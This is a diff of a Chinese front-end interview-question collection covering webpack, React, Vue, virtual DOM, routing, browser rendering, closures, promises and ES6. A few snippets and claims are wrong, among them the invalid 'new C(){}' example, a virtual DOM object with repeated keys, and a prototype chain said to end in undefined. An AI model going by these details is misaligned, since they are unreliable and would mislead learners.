@@ -1,2237 +1,1711 @@
-本文旨在加深对前端知识点的理解，资料来源于网络，由本人(博客：http://segmentfault.com/u/trigkit4) 收集整理。
+## 最新前端面试题
+
+### 职业规划
+
+
+首先应该是一个优秀的程序员
+其次是努力使自己成为某一领域的技术专家
+通过技术更好的服务于团队和业务
+提高沟通能力，团队协作，发现问题，解决问题，总结问题能力
+写写博客，输出就是最好的学习
+工作之外参与开源项目，会很有成就感和收货
+提升个人前端的工作效率和工作质量
+关注前端前言技术和发展方向，通过新技术服务团队和业务
+分享前端知识/开源项目
+一专多长
+
+想成为优秀的前端工程师，首先在专业技能领域必不可少，其次在团队贡献、业务思索、价值判断上也有要求。这三方面能决定你的专业技能能够为公司产出多大的价值，这是微店教给我的一个最重要的认知方式 -- 以价值驱动，让结果说话。
+
+我觉得程序员最核心的竞争力是学习力和责任。
+学习力的源泉就是好奇心，也就是对新知识的渴求，以及对探索未知的冲动。
+
+### 你希望加入一个什么样的团队
+
+- 对前端开发有激情
+- 能够持之以恒的学习
+- 团队做事方式是否规范（代码规范，安全规范，流程规范）
+- 团队有足够的成长空间，对自己有个清晰的定位。
+- 团队认可我的价值
 
 
 
-#### 一些开放性题目
+### 最后你有什么要问我的吗
 
-    1.自我介绍：除了基本个人信息以外，面试官更想听的是你与众不同的地方和你的优势。
+1.可以问一下公司具体的情况，比如我即将加入的部门的主要业务
+2.问一下具体工作情况，比如需要做哪些内容
+3.公司的氛围和公司的文化
+4.贵司对这项职务的工作内容和期望目标
 
-    2.项目介绍
+### 性能优化
 
-    3.如何看待前端开发？
+https://csspod.com/frontend-performance-best-practices/
 
-    4.平时是如何学习前端开发的？
+- 前端长列表的性能优化
 
-    5.未来三到五年的规划是怎样的？
+只渲染页面用用户能看到的部分。并且在不断滚动的过程中去除不在屏幕中的元素，不再渲染，从而实现高性能的列表渲染。
 
-<br>
+借鉴着这个想法，我们思考一下。当列表不断往下拉时，web中的dom元素就越多，即使这些dom元素已经离开了这个屏幕，不被用户所看到了，这些dom元素依然存在在那里。导致浏览器在渲染时需要不断去考虑这些dom元素的存在，造成web浏览器的长列表渲染非常低效。因此，实现的做法就是捕捉scroll事件，当dom离开屏幕，用户不再看到时，就将其移出dom tree。
 
+### 单页面应用的优缺点
 
+优点：
+1.用户体验好，快，内容的改变不需要重新加载整个页面
+2.基于上面一点，SPA相对服务器压力小
+3.没有页面切换，就没有白屏阻塞
 
-#### position的值， relative和absolute分别是相对于谁进行定位的？
+缺点：
+1、不利于SEO
+2、初次加载耗时增多
+3、导航不可用
+4、容易造成css命名冲突等
+5、页面复杂度提高很多，复杂逻辑难度成倍
 
+为什么不利于SEO？
 
-- `absolute` :生成绝对定位的元素， 相对于最近一级的 定位不是 static 的父元素来进行定位。
-
-- `fixed` （老IE不支持）生成绝对定位的元素，通常相对于浏览器窗口或 frame 进行定位。
-
-- `relative` 生成相对定位的元素，相对于其在普通流中的位置进行定位。
-
-- `static`  默认值。没有定位，元素出现在正常的流中
-
-- `sticky` 生成粘性定位的元素，容器的位置根据正常文档流计算得出
-
-<br>
-
-
-
-#### 如何解决跨域问题
-
->JSONP：
-
-原理是：动态插入`script`标签，通过`script`标签引入一个`js`文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的`json`数据作为参数传入。
-
-
-
-由于同源策略的限制，`XmlHttpRequest`只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过`script`标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求。
+SPA简单流程
+蜘蛛无法执行JS，相应的页面内容无从抓取
+```
+<html data-ng-app=”app”>是其标志性的标注。
+```
+对于这种页面来说，很多都是采用js等搜索引擎无法识别的技术来做的
 
 
 
-优点是兼容性好，简单易用，支持浏览器与服务器双向通信。缺点是只支持GET请求。
 
-`JSONP`：`json+padding`（内填充），顾名思义，就是把JSON填充到一个盒子里
 
-```js
-<script>
-    function createJs(sUrl){
+### 说说你对前端工程化的理解
 
-        var oScript = document.createElement('script');
-        oScript.type = 'text/javascript';
-        oScript.src = sUrl;
-        document.getElementsByTagName('head')[0].appendChild(oScript);
+前端工程化不外乎两点，规范和自动化。
+
+包括 团队开发规范，模块化开发，组件化开发，组件仓库，性能优化，部署，测试，开发流程，开发工具，脚手架，git工作流，团队协作
+
+1.构建工具
+2.持续集成
+3.系统测试
+4.日志统计
+5.上线部署
+6.敏捷开发
+7.性能优化
+8.基础框架
+
+
+
+### webpack 问题相关
+
+#### loader和plugin区别
+loader用于加载某些资源文件，因为webpack本身只能打包CommonJS规范的js文件，对于其他资源，例如css，图片等，是没有办法加载的，这就需要对应的loader将资源转换
+plugin用于扩展webpack的功能，直接作用于webpack，loader只专注于转换文件，而plugin不仅局限于资源加载
+
+Loader只能处理单一文件的输入输出，而Plugin则可以对整个打包过程获得更多的灵活性，譬如 ExtractTextPlugin，它可以将所有文件中的css剥离到一个独立的文件中，这样样式就不会随着组件加载而加载了。
+#### 什么是chunk
+
+Webpack提供一个功能可以拆分模块，每一个模块称为chunk，这个功能叫做Code Splitting。你可以在你的代码库中定义分割点，调用require.ensure，实现按需加载
+
+
+#### 如何开发一个loader，原理是啥
+
+A loader is a node module exporting a function.
+
+缓存： Webpack Loader 同样可以利用缓存来提高效率，并且只需在一个可缓存的 Loader 上加一句 this.cacheable()
+异步：在一个异步的模块中，回传时需要调用 Loader API 提供的回调方法 this.async()
+
+#### 打包原理
+
+webpack打包，最基本的实现方式，是将所有的模块代码放到一个数组里，通过数组ID来引用不同的模块
+```
+/************************************************************************/
+/******/ ([
+/* 0 */
+/***/ function(module, exports, __webpack_require__) {
+
+    __webpack_require__(1);
+    __webpack_require__(2);
+    console.log('Hello, world!');
+
+
+/***/ },
+/* 1 */
+/***/ function(module, exports) {
+
+    var a = 'a.js';
+    console.log("I'm a.js");
+
+/***/ },
+/* 2 */
+/***/ function(module, exports) {
+
+    var b = 'b.js';
+    console.log("I'm b.js");
+
+/***/ }
+/******/ ]);
+```
+可以发现入口entry.js的代码是放在数组索引0的位置，其它a.js和b.js的代码分别放在了数组索引1和2的位置，而webpack引用的时候，主要通过__webpack_require_的方法引用不同索引的模块。
+#### webpack和gulp的区别
+
+webpack是一种模块化打包工具，主要用于模块化方案，预编译模块的方案；gulp是工具链、构建工具，可以配合各种插件做js压缩，css压缩，less编译 替代手工实现自动化工作。
+
+Grunt/Gulp更多的是一种工作流；提供集成所有服务的一站式平台；
+gulp可以用来优化前端工作流程。
+
+#### 如何写一个plugin
+
+Compiler在开始打包时就进行实例化，实例对象里面装着与打包相关的环境和参数，包括options、plugins和loaders等。
+
+compilation对象，它继承于compiler，所以能拿到一切compiler的内容。Compilation表示有关模块资源，已编译资源，Compilation在每次文件变化重新打包时都进行一次实例化
+
+apply方法：当安装这个插件的时候，这个apply方法就会被webpack compiler调用。
+```
+function HelloWorldPlugin(options) {
+  // Setup the plugin instance with options...
+}
+
+HelloWorldPlugin.prototype.apply = function(compiler) {
+  compiler.plugin('done', function() {
+    console.log('Hello World!');
+  });
+};
+
+module.exports = HelloWorldPlugin;
+```
+#### webpack打包后文件体积过大怎么办？
+很多方法：异步加载模块（代码分割）；提取第三方库（使用cdn或者vender）；代码压缩；去除不必要的插件；去除devtool选项，dllplugin等等。
+
+### 移动端问题
+
+
+#### 说说你知道的移动端web的兼容性bug
+
+1、一些情况下对非可点击元素如(label,span)监听click事件，ios下不会触发，css增加cursor:pointer就搞定了。
+
+2.position 在Safari下的两个定位需要都写，只写一个容易发生错乱
+
+3.Input 的placeholder会出现文本位置偏上的情况
+
+input 的placeholder会出现文本位置偏上的情况：PC端设置line-height等于height能够对齐，而移动端仍然是偏上，解决是设置line-height：normal
+
+4. zepto点击穿透问题
+
+引入fastclick解决；event.preventDefault
+
+5.当输入框在最底部的时候，弹起的虚拟键盘会把输入框挡住。
+```
+Element.scrollIntoViewIfNeeded(opt_center)
+```
+如果有碰到兼容性的问题，我相信我也能很快解决的，因为其他人一定也碰到了，此时上网搜索应该是最佳最快速的选择
+
+
+
+### react和vue的区别
+
+相同点：
+1.都支持服务端渲染
+2. 都有Virtual DOM，组件化开发，通过props参数进行父子组件数据的传递，都实现webComponents规范
+3. 数据驱动视图
+4. 都有支持native的方案，React的React native，Vue的weex
+
+不同点：
+1.React严格上只针对MVC的view层，Vue则是MVVM模式
+2.virtual DOM 不一样
+vue会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。而对于React而言，每当应用的状态被改变时，全部子组件都会重新渲染。当然，这可以通过shouldComponentUpdate这个生命周期方法来进行控制，
+3.组件写法不一样
+React 推荐的做法是 JSX + inline style，也就是把 HTML 和 CSS 全都写进 JavaScript 了，即”all in js”
+Vue 推荐的是使用 `webpack + vue-loader` 的单文件组件格式，即html,css,js写在同一个文件；
+4.数据绑定：Vue有实现了双向数据绑定，React数据流动是单向的
+5.state对象在react应用中是不可变的，需要使用setState方法更新状态；在Vue中，state对象并不是必须的，数据由data属性在Vue对象中进行管理。
+
+
+
+### react相关
+
+#### react的优缺点
+
+我觉得这优缺点就因人而异，见仁见智了。
+
+优点：
+1.可以通过函数式方法描述视图组件（好处：相同的输入会得到同样的渲染结果，不会有副作用；组件不会被实例化，整体渲染性能得到提升）
+2.集成虚拟DOM（性能好）
+3.单向数据流（好处是更容易追踪数据变化排查问题
+4.一切都是component：代码更加模块化，重用代码更容易，可维护性高
+5.大量拥抱 es6 新特性
+6.jsx
+
+缺点：
+1.jsx的一个问题是，渲染函数常常包含大量逻辑，最终看着更像是程序片段，而不是视觉呈现。后期如果发生需求更改，维护起来工作量将是巨大的
+2.大而全，上手有难度
+
+
+
+#### jsx的优缺点
+
+
+允许使用熟悉的语法来定义HTML元素树
+JSX 让小组件更加简单、明了、直观。
+更加语义化且易懂的标签
+JSX 本质是对JavaScript语法的一个扩展，看起来像是某种模板语言，但其实不是。但正因为形似HTML，描述UI就更直观了，也极大地方便了开发；
+在React中babel会将JSX转换为`React.createElement`函数调用，然后将JSX转换为正确的JSON对象（VDOM 也是一个“树”形的结构）
+React/JSX乍看之下，觉得非常啰嗦，但使用JavaScript而不是模板语法来开发（模板语法比较有局限性），赋予了开发者许多编程能力。
+
+### dom diff算法和虚拟DOM
+
+React中的render方法，返回一个DOM描述，结果仅仅是轻量级的js对象。Reactjs只在调用setState的时候会更新dom，而且还是先更新Virtual Dom，然后和实际DOM比较，最后再更新实际DOM。
+
+React.js 厉害的地方并不是说它比 DOM 快（这句话本来就是错的），而是说不管你数据怎么变化，我都可以以最小的代价来更新 DOM。方法就是我在内存里面用新的数据刷新一个虚拟的 DOM 树，然后新旧 DOM 树进行比较，找出差异，再更新到真正的 DOM 树上。
+
+当我们修改了DOM树上一些节点对应绑定的state，React会立即将它标记为“脏状态”。在事件循环的最后才重新渲染所有的脏节点。在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面，最后把差异应用到真正的DOM树上。
+算法实现
+1 步骤一：用JS对象模拟DOM树
+2 步骤二：比较两棵虚拟DOM树的差异
+3 步骤三：把差异应用到真正的DOM树上
+这就是所谓的 diff 算法
+
+dom diff采用的是增量更新的方式，类似于打补丁。React 需要为数据添加 key 来保证虚拟 DOM diff 算法的效率。key属性可以帮助React定位到正确的节点进行比较，从而大幅减少DOM操作次数，提高了性能。
+
+
+`virtual dom`，也就是虚拟节点。它通过JS的Object对象模拟DOM中的节点，然后再通过特定的render方法将其渲染成真实的DOM节点。
+http://react-china.org/t/dom/638
+
+- 为什么js对象模拟DOM会比js操作DOM来得快
+
+为了解决频繁操作DOM导致Web应用效率下降的问题，React提出了“虚拟DOM”（virtual DOM）的概念。Virtual DOM是使用JavaScript对象模拟DOM的一种对象结构。DOM树中所有的信息都可以用JavaScript表述出来，例如：
+```
+<ul>
+  <li>Item 1</li>
+  <li>Item 2</li>
+  <li>Item 3</li>
+</ul>
+```
+可以用以下JavaScript对象来表示：
+```
+{
+  tag: 'ul',
+  children: [{
+    tag: 'li', children: ['Item 1'],
+    tag: 'li', children: ['Item 2'],
+    tag: 'li', children: ['Item 3']
+  }]
+}
+```
+这样可以避免直接频繁地操作DOM，只需要在js对象模拟的虚拟DOM进行比对，再将更改的部分应用到真实的DOM树上
+
+- react组件性能优化
+
+使用PureRenderMixin、shouldComponentUpdate来避免不必要的虚拟DOM diff，在render内部优化虚拟DOM的diff速度，以及让diff结果最小化。
+
+#### react组件间的数据传递
+
+1.兄弟组件不能直接相互传送数据，此时可以将数据挂载在父组件中，由两个组件共享
+
+2.子组件向父组件通讯，可以通过父组件定义事件（回调函数），子组件调用该函数，通过实参的形式来改变父组件的数据来通信
+
+```
+//子组件
+this.props.onCommentSubmit({author, content, date:new Date().getTime()});
+//父组件
+render(){
+    return(
+      <div className="m-index">
+        <div>
+          <h1>评论</h1>
+        </div>
+        <CommentList data={this.state.data} />
+        <CommentForm onCommentSubmit={this.handleCommentSubmit.bind(this)} />
+      </div>
+    )
+}
+```
+
+
+3.非父子组件间的通信：可以使用全局事件来实现组件间的沟通，React中可以引入eventProxy模块，利用`eventProxy.trigger()`方法发布消息，`eventProxy.on()`方法监听并接收消息。
+
+4.组件间层级太深，可以使用上下文方式，让子组件直接访问祖先的数据或函数，通过`this.context.xx`
+
+#### 无状态组件
+
+无状态组件其实本质上就是一个函数，传入props即可，没有state，也没有生命周期方法。组件本身对应的就是render方法。例子如下
+```
+function Title({color = 'red', text = '标题'}) {
+  let style = {
+    'color': color
+  }
+  return (
+    <div style = {style}>{text}</div>
+  )
+}
+
+```
+
+无状态组件不会创建对象，故比较省内存。没有复杂的生命周期方法调用，故流程比较简单。没有state，也不会重复渲染。它本质上就是一个函数而已。
+
+对于没有状态变化的组件，React建议我们使用无状态组件。总之，能用无状态组件的地方，就用无状态组件。
+#### 高阶组件
+
+高阶组件（HOC）是函数接受一个组件，返回一个新组件。其前身其实是用ES5创建组件时可用的mixin方法，但是在react版本升级过程中，使用ES6语法创建组件时，认为mixin是反模式，影响了react架构组件的封装稳定性，增加了不可控的复杂度，逐渐被HOC所替代。
+实现高阶组件的方式有：
+
+- 属性代理
+
+```
+import React, { Component } from 'React';
+//高阶组件定义
+const HOC = (WrappedComponent) =>
+  class WrapperComponent extends Component {
+    render() {
+      return <WrappedComponent {...this.props} />;
     }
-
-    createJs('jsonp.js');
-
-    box({
-       'name': 'test'
-    });
-
-    function box(json){
-        alert(json.name);
+}
+//普通的组件
+class WrappedComponent extends Component{
+    render(){
+        //....
     }
-</script>
+}
+
+//高阶组件使用
+export default HOC(WrappedComponent)
+```
+- 反向继承
+
+反向继承是指返回的组件去继承之前的组件(这里都用WrappedComponent代指)
+
+	const HOC = (WrappedComponent) =>
+	  class extends WrappedComponent {
+	    render() {
+	      return super.render();
+	    }
+	  }
+
+我们可以看见返回的组件确实都继承自WrappedComponent,那么所有的调用将是反向调用的(例如:super.render())，这也就是为什么叫做反向继承。
+　　
+#### react事件和传统事件有什么区别吗
+
+React 实现了一个“合成事件”层（synthetic event system），这个事件模型保证了和 W3C 标准保持一致，所以不用担心有什么诡异的用法，并且这个事件层消除了 IE 与 W3C 标准实现之间的兼容问题。
+
+“合成事件”还提供了额外的好处：
+
+- 事件委托
+
+“合成事件”会以事件委托（event delegation）的方式绑定到组件最上层，并且在组件卸载（unmount）的时候自动销毁绑定的事件。
+
+
+
+#### react组件生命周期
+
+![Alt text](./1501943817143.png)
+
+react组件更新过程：
+
+- props/state change：
+
+1.componentWillReceiveProps(nextProps)
+
+只要是父组件的render被调用，在render中被渲染的子组件就会经历更新的过程。不管父组件传给子组件的props有没有改变，都会触发子组件的此函数被调用。注意：通过setState方法触发的更新不会调用此函数
+
+2.shouldComponentUpdate(nextProps,nextState)
+3.componentWillUpdate
+4.render
+5.componentDidUpdate
+
+
+### vue 相关
+
+#### vue 双向绑定底层实现原理
+
+vue.js 采用数据劫持的方式，结合发布者-订阅者模式，通过`Object.defineProperty()`来劫持各个属性的setter，getter以监听属性的变动，在数据变动时发布消息给订阅者，触发相应的监听回调：
+
+https://github.com/hawx1993/tech-blog/issues/11
+
+#### vue 虚拟DOM和react 虚拟DOM的区别
+
+在渲染过程中，会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。而对于React而言，每当应用的状态被改变时，全部子组件都会重新渲染。
+在 React 应用中，当某个组件的状态发生变化时，它会以该组件为根，重新渲染整个组件子树。
+如要避免不必要的子组件的重新渲染，你需要在所有可能的地方使用 PureComponent，或是手动实现` shouldComponentUpdate` 方法
+
+在React中，数据流是自上而下单向的从父节点传递到子节点，所以组件是简单且容易把握的，子组件只需要从父节点提供的props中获取数据并渲染即可。如果顶层组件的某个prop改变了，React会递归地向下遍历整棵组件树，重新渲染所有使用这个属性的组件。
+
+#### v-show和v-if区别
+
+与v-if不同的是，无论v-show的值为true或false，元素都会存在于HTML代码中；而只有当v-if的值为true，元素才会存在于HTML代码中
+
+#### vue组件通信
+
+非父子组件间通信，Vue 有提供 Vuex，以状态共享方式来实现同信，对于这一点，应该注意考虑平衡，从整体设计角度去考量，确保引入她的必要。
+
+
+父传子: `this.$refs.xxx`
+子传父: `this.$parent.xxx`
+
+
+还可以通过`$emit`方法出发一个消息，然后`$on`接收这个消息
+
+#### 你如何评价vue
+
+框架能够让我们跑的更快，但只有了解原生的JS才能让我们走的更远。
+
+vue专注于MVVM中的viewModel层，通过双向数据绑定，把view层和Model层连接了起来。核心是用数据来驱动DOM。这种把directive和component混在一起的设计有一个非常大的问题，它导致了很多开发者滥用Directive（指令），出现了到处都是指令的情况。
+
+优点：
+1.不需要setState，直接修改数据就能刷新页面，而且不需要react的shouldComponentUpdate就能实现最高效的渲染路径。
+2.渐进式的开发模式，模版方式->组件方式->路由整合->数据流整合->服务器渲染。上手的曲线更加平滑简单，而且不像react一上来就是组件全家桶
+3.v-model给开发后台管理系统带来极大的便利，反观用react开发后台就是个杯具
+4.html，css与js比react更优雅地结合在一个文件上。
+
+缺点：指令太多，自带模板扩展不方便；
+组件的属性传递没有react的直观和明显
+
+#### 说说你对MVVM的理解
+
+Model层代表数据模型，可以在Model中定义数据修改和操作业务逻辑；
+view 代表UI组件。负责将数据模型转换成UI展现出来
+ViewModel 是一个同步View和Model的对象
+
+用户操作view层，view数据变化会同步到Model，Model数据变化会立即反应到view中。viewModel通过双向数据绑定把view层和Model层连接了起来
+
+#### 为什么选择vue
+
+reactjs 的全家桶方式，实在太过强势，而自己定义的 JSX 规范，揉和在 JS 的组件框架里，导致如果后期发生页面改版工作，工作量将会巨大。
+
+vue的核心：数据绑定 和 视图组件。
+
+- Vue的数据驱动：数据改变驱动了视图的自动更新，传统的做法你得手动改变DOM来改变视图，vuejs只需要改变数据，就会自动改变视图，一个字：爽。再也不用你去操心DOM的更新了，这就是MVVM思想的实现。
+
+- 视图组件化：把整一个网页的拆分成一个个区块，每个区块我们可以看作成一个组件。网页由多个组件拼接或者嵌套组成
+
+#### vue中mixin与extend区别
+
+全局注册混合对象，会影响到所有之后创建的vue实例，而`Vue.extend`是对单个实例进行扩展。
+
+-  mixin 混合对象（组件复用）
+
+同名钩子函数（bind，inserted，update，componentUpdate，unbind）将混合为一个数组，因此都将被调用，混合对象的钩子将在组件自身钩子之前调用
+
+`methods`，`components`，`directives`将被混为同一个对象。两个对象的键名（方法名，属性名）冲突时，取组件（而非mixin）对象的键值对
+
+
+
+### 双向绑定和单向数据绑定的优缺点
+
+只有 UI控件 才存在双向，非 UI控件 只有单向。
+单向绑定的优点是可以带来单向数据流，这样的好处是流动方向可以跟踪，流动单一，没有状态, 这使得单向绑定能够避免状态管理在复杂度上升时产生的各种问题, 程序的调试会变得相对容易。单向数据流更利于状态的维护及优化，更利于组件之间的通信，更利于组件的复用
+
+
+- 双向数据流的优点：
+
+无需进行和单向数据绑定的那些CRUD（Create，Retrieve，Update，Delete）操作；
+双向绑定在一些需要实时反应用户输入的场合会非常方便
+用户在视图上的修改会自动同步到数据模型中去，数据模型中值的变化也会立刻同步到视图中去；
+
+- 缺点：
+
+双向数据流是自动管理状态的, 但是在实际应用中会有很多不得不手动处理状态变化的逻辑, 使得程序复杂度上升
+无法追踪局部状态的变化
+双向数据流，值和UI绑定，但由于各种数据相互依赖相互绑定，导致数据问题的源头难以被跟踪到
+
+Vue 虽然通过 v-model 支持双向绑定，但是如果引入了类似redux的vuex，就无法同时使用 v-model。
+
+双绑跟单向绑定之间的差异只在于，双向绑定把数据变更的操作隐藏在框架内部，调用者并不会直接感知。
+```
+<input v-model="something">
+<!-- 等价于以下内容 -->
+<input :value="something" @input="something = $event.target.value">
+```
+也就是说，你只需要在组件中声明一个name为value的props，并且通过触发input事件传入一个值，就能修改这个value。
+
+
+
+### 前端路由实现方式
+
+
+#### 两种实现前端路由的方式
+HTML5 History两个新增的API：history.pushState 和 history.replaceState，两个 API 都会操作浏览器的历史记录，而不会引起页面的刷新。
+
+Hash就是url 中看到 # ,我们需要一个根据监听哈希变化触发的事件( hashchange) 事件。我们用 window.location 处理哈希的改变时不会重新渲染页面，而是当作新页面加到历史记录中，这样我们跳转页面就可以在 hashchange 事件中注册 ajax 从而改变页面内容。
+ 可以为hash的改变添加监听事件：
+```
+window.addEventListener("hashchange", funcRef, false)
+```
+
+- 优点
+
+从性能和用户体验的层面来比较的话，后端路由每次访问一个新页面的时候都要向服务器发送请求，然后服务器再响应请求，这个过程肯定会有延迟。而前端路由在访问一个新页面的时候仅仅是变换了一下路径而已，没有了网络延迟，对于用户体验来说会有相当大的提升。
+
+前端路由的优点有很多，比如页面持久性，像大部分音乐网站，你都可以在播放歌曲的同时，跳转到别的页面而音乐没有中断，再比如前后端彻底分离。
+开发一个前端路由，主要考虑到页面的可插拔、页面的生命周期、内存管理等。
+
+- 缺点
+
+使用浏览器的前进，后退键的时候会重新发送请求，没有合理地利用缓存。
+
+History interface提供了两个新的方法：`pushState()`, `replaceState()`使得我们可以对浏览器历史记录栈进行修改：
+```
+window.history.pushState(stateObject, title, URL)
+window.history.replaceState(stateObject, title, URL)
 ```
 
 
->CORS
-
-服务器端对于`CORS`的支持，主要就是通过设置`Access-Control-Allow-Origin`来进行的。如果浏览器检测到相应的设置，就可以允许`Ajax`进行跨域的访问。
+### 浏览器渲染原理解析
 
 
-
->通过修改document.domain来跨子域
-
-将子域和主域的`document.domain`设为同一个主域.前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用`document.domain`进行跨域
+![Alt text](./1500207571501.png)
 
 
-
-主域相同的使用`document.domain`
-
->使用window.name来进行跨域
-
-
-
-`window`对象有个`name`属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个`window.name`的，每个页面对`window.name`都有读写的权限，`window.name`是持久存在一个窗口载入过的所有页面中的
+1、首先渲染引擎下载HTML，解析生成DOM Tree
+2、遇到css标签或JS脚本标签就新起线程去下载他们，并继续构建DOM。（其中css是异步下载同步执行）浏览器引擎通过 DOM Tree 和 CSS Rule Tree 构建 Rendering Tree
+3、 通过 CSS Rule Tree 匹配 DOM Tree 进行定位坐标和大小，这个过程称为 Flow 或 Layout 。
+4、最终通过调用Native GUI 的 API 绘制网页画面的过程称为 Paint 。
 
 
+当用户在浏览网页时进行交互或通过 js 脚本改变页面结构时，以上的部分操作有可能重复运行，此过程称为 Repaint 或 Reflow。
+重排是指dom树发生结构变化后，需要重新构建dom结构。
+重绘是指dom节点样式改变，重新绘制。
+重排一定会带来重绘，重绘不一定有重排。
+
+如何减少浏览器重排：将需要多次重排的元素，position属性设为absolute或fixed，这样此元素就脱离了文档流，它的变化不会影响到其他元素。
+
+### 闭包
+
+特性：
+1.函数嵌套函数
+2.函数内部可以引用外部的参数和变量
+3.参数和变量不会被垃圾回收机制回收
+
+闭包的缺点就是常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。
 
 
->使用HTML5中新引进的`window.postMessage`方法来跨域传送数据
+为什么要使用闭包：
+
+为了设计私有方法和变量，避免全局变量污染
+希望一个变量长期驻扎在内存中
 
 
+### async，Promise，Generator函数，co函数库区别
 
-还有flash、在服务器上设置代理页面等跨域方式。个人认为`window.name`的方法既不复杂，也能兼容到几乎所有浏览器，这真是极好的一种跨域方法。
+`async...await`写法最简洁，最符合语义。async/await让异步代码看起来、表现起来更像同步代码，这正是其威力所在。async 函数就是 Generator 函数的语法糖，只不过async内置了自动执行器。async 函数就是将 Generator 函数的星号（*）替换成 async，将 yield 替换成 await
 
+#### async函数优点
 
+1） Generator 函数必须靠执行器，所以才有CO函数库，async函数自带执行器
+2）更好的语义
+3）更广的适用性。co函数库yield后面只能是Thunk函数或者Promise对象，await后面可以跟Promise对象和原始类型值（等同于同步操作）
 
+ Generator 函数：可以把它理解成一个函数的内部状态的遍历器，Generator重点在解决异步回调金字塔问题，巧妙的使用它可以写出看起来同步的代码。
 
+#### co函数库
 
-#### `XML`和`JSON`的区别？
+co可以说是给generator增加了promise实现。co是利用Generator的方式实现了`async/await`（co返回Promise对象，async也返回Promise对象，co内部的generator函数即async，yield相当于await）
 
-```html
-(1).数据体积方面。
+co 函数库其实就是将两种自动执行器（Thunk 函数和 Promise 对象），包装成一个库。
 
-JSON相对于XML来讲，数据的体积小，传递的速度更快些。
+co函数接收一个Generator生成器函数作为参数。执行co函数的时候，生成器函数内部的逻辑像async函数调用时一样被执行。不同之处只是这里的await变成了yield（产出）。
 
-(2).数据交互方面。
+```javascript
+co(function* () {
+  var result = yield Promise.resolve(true);
+  return result;
+}).then(function (value) {
+  console.log(value);
+}, function (err) {
+  console.error(err.stack);
+});
+```
+Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件监听——更合理和更强大。
+promise catch函数和then第二个函数参数：
 
-JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互。
-
-(3).数据描述方面。
-
-JSON对数据的描述性比XML较差。
-
-(4).传输速度方面。
-
-JSON的速度要远远快于XML。
+```javascript
+promise.catch();
+// 等价于
+promise.then(null, function(reason){});
 ```
 
+### Restful
+
+REST（Representational State Transfer）
+REST的意思是表征状态转移，是一种基于HTTP协议的网络应用接口风格，充分利用HTTP的方法实现统一风格接口的服务，HTTP定义了以下8种标准的方法：
+* GET：请求获取指定资源
+* HEAD：请求指定资源的响应头
+* PUT ：请求服务器存储一个资源
+根据REST设计模式，这四种方法通常分别用于实现以下功能：
+GET（获取），POST（新增），PUT（更新），DELETE（删除）
 
 
-#### 谈谈你对webpack的看法
+### 什么是原型链
 
+当从一个对象那里调取属性或方法时，如果该对象自身不存在这样的属性或方法，就会去自己关联的`prototype`对象那里寻找，如果prototype没有，就会去prototype关联的前辈prototype那里寻找，如果再没有则继续查找`Prototype.Prototype`引用的对象，依次类推，直到Prototype.….Prototype为undefined（Object的Prototype就是undefined）从而形成了所谓的“原型链”。
 
+其中foo是Function对象的实例。而Function的原型对象同时又是Object的实例。这样就构成了一条原型链。
+```
+function foo(){}
+```
+#### instanceof   确定原型和实例之间的关系
 
-`WebPack` 是一个模块打包工具，你可以使用`WebPack`管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的`HTML、Javascript、CSS`以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，`webpack`有对应的模块加载器。`webpack`模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源。
+用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链上
 
-
-`webpack`的两大特色：
-
-    1.code splitting（可以自动完成）
-
-    2.loader 可以处理各种类型的静态文件，并且支持串联操作
-
-
-`webpack` 是以` commonJS `的形式来书写脚本滴，但对 `AMD/CMD` 的支持也很全面，方便旧项目进行代码迁移。
-
-`webpack`具有`requireJs`和`browserify`的功能，但仍有很多自己的新特性：
-
+对象的`__proto__`指向自己构造函数的prototype。`obj.__proto__.__proto__...`的原型链由此产生，包括我们的操作符instanceof正是通过探测`obj.__proto__.__proto__... === Constructor.prototype`来验证obj是否是Constructor的实例。
 
 ```
-1. 对 CommonJS 、 AMD 、ES6的语法做了兼容
+function C(){}
 
-2. 对js、css、图片等资源文件都支持打包
+var o = new C(){}
+//true 因为Object.getPrototypeOf(o) === C.prototype
+o instanceof C
+```
+instanceof只能用来判断对象和函数，不能用来判断字符串和数字
 
-3. 串联式模块加载器以及插件机制，让其具有更好的灵活性和扩展性，例如提供对CoffeeScript、ES6的支持
+#### isPrototypeOf
 
-4. 有独立的配置文件webpack.config.js
+用于测试一个对象是否存在于另一个对象的原型链上。
 
-5. 可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间
+判断父级对象   可检查整个原型链
 
-6. 支持 SourceUrls 和 SourceMaps，易于调试
+### ES6相关
+#### 谈一谈let与var和const的区别？
 
-7. 具有强大的Plugin接口，大多是内部插件，使用起来比较灵活
+- let为ES6新添加申明变量的命令，它类似于var，但是有以下不同：
+- let命令不存在变量提升，如果在let前使用，会导致报错
+- 暂时性死区的本质，其实还是块级作用域必须“先声明后使用”的性质。
+- let，const和class声明的全局变量不是全局对象的属性。
 
-8.webpack 使用异步 IO 并具有多级缓存。这使得 webpack 很快且在增量编译上更加快
+const声明的变量与let声明的变量类似，它们的不同之处在于，const声明的变量只可以在声明时赋值，不可随意修改，否则会导致SyntaxError（语法错误）。
+
+const只是保证变量名指向的地址不变，并不保证该地址的数据不变。const可以在多个模块间共享
+let 暂时性死区的原因：var 会变量提升，let 不会。
+#### 箭头函数
+
+箭头函数不属于普通的 function，所以没有独立的上下文。箭头函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。
+由于箭头函数没有自己的this，函数对象中的call、apply、bind三个方法，无法"覆盖"箭头函数中的this值。
